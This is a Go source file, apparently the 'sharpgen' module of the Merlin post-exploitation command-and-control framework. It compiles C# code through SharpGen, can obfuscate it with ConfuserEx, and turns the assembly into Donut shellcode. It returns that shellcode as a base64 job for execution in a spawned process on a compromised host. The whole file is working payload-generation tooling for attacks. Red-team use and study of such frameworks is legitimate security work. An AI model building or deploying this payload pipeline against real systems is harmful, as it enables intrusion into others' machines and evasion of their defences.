/*
Merlin is a post-exploitation command and control framework.
This file is part of Merlin.
Copyright (C) 2022  Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

// Additional licenses for external programs and code libraries are at the end of the file
// Moved to the end of the file because it was generating IDE errors with that many lines of comment

package sharpgen

import (
	// standard
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"strings"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/core"
	"github.com/Ne0nd0g/merlin/pkg/modules/donut"
)

// Parse is the initial entry point for all extended modules. All validation checks and processing will be performed here
// The function input types are limited to strings and therefore require additional processing
func Parse(options map[string]string) ([]string, error) {
	// Verify the expected options are present
	opts := []string{"dotnetbin", "sharpgenbin", "help", "file", "dotnet", "output-kind", "platform", "no-optimization", "assembly-name", "source-file", "class-name", "confuse", "code", "verbose", "spawnto", "args"}

	for _, opt := range opts {
		if _, ok := options[opt]; !ok {
			return nil, fmt.Errorf("the %s option was not found but is required", opt)
		}
	}

	var sharpGenConfig Config

	// Help flag
	if strings.ToLower(options["help"]) == "true" {
		sharpGenConfig.Help = true
	}

	// No Optimization
	if options["no-optimization"] == "true" {
		sharpGenConfig.Optimization = true
	}

	// Verbose
	if options["verbose"] == "true" {
		sharpGenConfig.Verbose = true
	}

	// Source File
	if options["source-file"] != "" {
		// Check to make sure the file is there
		_, errSource := os.Stat(options["source-file"])
		if os.IsNotExist(errSource) {
			return nil, fmt.Errorf("unable to find source-file: %s\r\n%s", options["source-file"], errSource)
		}
		sharpGenConfig.SourceCode = options["source-file"]
	}

	// ConfuserEx project file
	if options["confuse"] != "" {
		// Check to make sure the file is there
		_, errConfuse := os.Stat(options["confuse"])
		if os.IsNotExist(errConfuse) {
			return nil, fmt.Errorf("unable to find ConfuserEx ProjectFile: %s\r\n%s", options["confuse"], errConfuse)
		}
		sharpGenConfig.Confuse = options["confuse"]
	}

	// Output file flag
	dir, _ := filepath.Split(options["file"])
	if dir == "" {
		sharpGenConfig.OutputFile = filepath.Join(core.CurrentDir, options["file"])
	} else {
		sharpGenConfig.OutputFile = options["file"]
	}

	sharpGenConfig.DotNetVersion = options["dotnet"]       // dotnet version; If blank use the default
	sharpGenConfig.OutputKind = options["output-kind"]     // OutputKind
	sharpGenConfig.Platform = options["platform"]          // Platform
	sharpGenConfig.AssemblyName = options["assembly-name"] // Assembly Name
	sharpGenConfig.ClassName = options["class-name"]       // Class Name
	sharpGenConfig.InlineCode = options["code"]            // Inline code; This is a positional argument
	sharpGenConfig.SharpGenBin = options["sharpgenbin"]    // The location of SharpGen.dll
	sharpGenConfig.DotNetBin = options["dotnetbin"]        // Location of the `dotnet` Core 2.1 SDK executable

	// Compile application and get bytes
	err := Generate(&sharpGenConfig)
	if err != nil {
		return nil, err
	}

	// Use Donut to turn .NET program into shellcode
	donutConfig := donut.GetDonutDefaultConfig()
	donutConfig.ExitOpt = 2
	donutConfig.Type = 2 //DONUT_MODULE_NET_EXE = 2; .NET EXE. Executes Main if no class and method provided
	//donutConfig.Runtime = "v4.0.30319"
	donutConfig.Entropy = 3
	donutConfig.Parameters = "" // TODO add module option for executable arguments when running

	// Convert assembly into shellcode with donut
	donutBuffer, err := donut.BytesFromConfig(sharpGenConfig.OutputFile, donutConfig)
	if err != nil {
		return nil, fmt.Errorf("error turning assembly into shellcode bytes with donut:\r\n%s", err)
	}

	return []string{"CreateProcess", base64.StdEncoding.EncodeToString(donutBuffer.Bytes()), options["spawnto"], options["args"]}, nil
}

// Generate uses .NET core to compile source code and return the assembly as bytes
func Generate(config *Config) error {
	// Check 'dotnetbin' argument first
	_, errStat := os.Stat(config.DotNetBin)
	// Make sure it exists
	if os.IsNotExist(errStat) {
		// Check to see if it is in the PATH
		p, errDotNet := exec.LookPath(config.DotNetBin)
		if errDotNet != nil {
			return fmt.Errorf("unable to find dotnet core executable %s\r\nEnsure .NET Core 2.1 SDK is installed: https://dotnet.microsoft.com/download", config.DotNetBin)
		}
		_, err := os.Stat(p)
		if err != nil {
			return fmt.Errorf("there was an error validating the dotnet executable %s:\r\n%s", p, err)
		}
		config.DotNetBin = p
	}

	// Check that the SharpGen binary exists
	// TODO Build SharpGen binary if it isn't there
	// Check the file path provided in the execute module
	if path.IsAbs(config.SharpGenBin) {
		_, errA := os.Stat(config.SharpGenBin)
		if errA != nil {
			return fmt.Errorf("the provided SharpGen filepath does not exist: %s\r\n%s\r\nBuild SharpGen from it's source directory with: dotnet build -c release", config.SharpGenBin, errA)
		}
	} else {
		// Check Merlin's root directory
		dll := core.CurrentDir
		p := path.Join(dll, config.SharpGenBin)
		_, errDLL := os.Stat(p)
		if os.IsNotExist(errDLL) {
			return fmt.Errorf("unable to find SharpGen executable %s\r\n%s\r\nBuild SharpGen from it's source directory with: dotnet build -c release", config.SharpGenBin, errDLL)
		}
		config.SharpGenBin = p
	}

	// Build arguments
	args := []string{config.SharpGenBin}

	if config.Help {
		args = append(args, "--help")
	} else {
		// File
		if config.OutputFile == "" {
			return fmt.Errorf("an output file name must be provided")
		}
		args = append(args, "--file", config.OutputFile)

		// OutputKind
		if config.OutputKind != "" {
			args = append(args, "--output-kind", config.OutputKind)
		}

		// Platform
		if config.Platform != "" {
			args = append(args, "--platform", config.Platform)
		}

		// Optimization
		if config.Optimization {
			args = append(args, "--no-optimization")
		}

		// Assembly Name
		if config.AssemblyName != "" {
			args = append(args, "--assembly-name", config.AssemblyName)
		}

		// SourceFile
		if config.SourceCode != "" {
			args = append(args, "--source-file", config.SourceCode)
		}

		// Class Name
		if config.ClassName != "" {
			args = append(args, "--class-name", config.ClassName)
		}

		// ConfuserEx
		if config.Confuse != "" {
			args = append(args, "--confuse", config.Confuse)
		}

		// Inline Code
		if config.InlineCode != "" && config.SourceCode == "" {
			args = append(args, config.InlineCode)
		}
	}

	// Execute SharpGen
	cmd := exec.Command(config.DotNetBin, args...) // #nosec G204 Intended to run this way
	// TODO Need to send back a messages.UserMessage
	if config.Verbose {
		fmt.Println(cmd.String())
	}
	stdOut, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("there was an error executing SharpGen: %s", err)
	}
	// TODO Need to send back a messages.UserMessage
	if config.Verbose {
		fmt.Printf("\r\n%s\r\n", stdOut)
	}
	return nil
}

// Config is a structure that contains all the necessary information for the SharpGen module to create a payload
type Config struct {
	DotNetBin     string // Location of the `dotnet` executable
	SharpGenBin   string // Location of the SharpGen DLL
	DotNetVersion string // The Dotnet Framework version to target (net35 or net40)
	OutputFile    string // Location where the generated .NET assembly will be save
	OutputKind    string // The OutputKind to use (dll or console)
	Platform      string // The Platform to use (AnyCpy, x86, or x64)
	AssemblyName  string // The name of the assembly to be generated
	SourceCode    string // The source code to compile
	InlineCode    string // CSharp code to compile
	ClassName     string // The name of the class to be generated
	Optimization  bool   // Don't use source code optimization
	Confuse       string // The ConfuserEx ProjectFile configuration
	Verbose       bool   // Enable verbose output to STDOUT
	Help          bool   // Print Help
}
